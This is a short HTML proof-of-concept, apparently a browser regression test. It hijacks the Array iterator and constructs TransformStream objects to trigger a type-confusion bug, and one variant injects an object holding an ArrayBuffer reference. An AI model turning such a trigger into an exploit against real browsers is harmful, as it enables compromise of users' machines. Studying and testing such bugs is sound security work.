<!DOCTYPE html>
<html>
<body>
<script>
const originalIterator = Array.prototype[Symbol.iterator];

// Variant 1: substitute plain objects for the readable/writable slots.
Array.prototype[Symbol.iterator] = function() {
    const arr = this;
    let i = 0;
    return {
        next() {
            if (i >= arr.length)
                return { done: true };
            let val = arr[i];
            if (arr.length === 3 && i >= 1)
                val = { fake: true };
            i++;
            return { value: val, done: false };
        }
    };
};
new TransformStream();

// Variant 2: substitute an object that holds a heap pointer.
let buf = new ArrayBuffer(65536);
Array.prototype[Symbol.iterator] = function() {
    const arr = this;
    let i = 0;
    return {
        next() {
            if (i >= arr.length)
                return { done: true };
            let val = arr[i];
            if (arr.length === 3 && i >= 1)
                val = { pad: 0, ptr: buf };
            i++;
            return { value: val, done: false };
        }
    };
};
new TransformStream();

// Variant 3: truncated iterator returning fewer than 3 entries.
Array.prototype[Symbol.iterator] = function() {
    return { next() { return { done: true }; } };
};
new TransformStream();

Array.prototype[Symbol.iterator] = originalIterator;
</script>
</body>
</html>
